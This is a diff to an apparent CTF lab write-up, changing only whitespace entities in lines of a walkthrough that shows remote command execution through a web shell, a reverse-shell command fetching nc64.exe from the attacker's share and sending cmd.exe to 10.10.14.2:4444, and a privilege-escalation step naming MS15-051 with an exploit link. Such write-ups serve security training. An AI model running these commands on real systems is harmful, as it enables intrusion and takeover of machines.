@@ -60,7 +60,7 @@ $ curl -G --data-urlencode 'cmd=whoami' 'http://10.129.84.254/test.php'
 nt authority\iusr
 ```
 
-We now have RCE, and getting a reverse shell can be done through `nc.exe`.&#x20;
+We now have RCE, and getting a reverse shell can be done through `nc.exe`.
 
 ```
 $ curl -G --data-urlencode 'cmd=\\10.10.14.2\share\nc64.exe -e cmd.exe 10.10.14.2 4444' 'http://10.129.84.254/test.php'
@@ -72,7 +72,7 @@ Grab the user flag.
 
 ## Privilege Escalation -> Kernel
 
-This is a really old machine, so tehre's bound to be some Windows Kernel exploit that we can use.&#x20;
+This is a really old machine, so tehre's bound to be some Windows Kernel exploit that we can use.
 
 ```
 C:\Users\dimitris>whoami /priv
@@ -129,7 +129,7 @@ Network Card(s):           1 NIC(s) Installed.
                                  [01]: 10.129.84.254
 ```
 
-`SeImpersonatePrivilege` is also enabled, making this an easy exploit. For this particular case, we can use MS15-051.&#x20;
+`SeImpersonatePrivilege` is also enabled, making this an easy exploit. For this particular case, we can use MS15-051.
 
 {% embed url="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip" %}
 
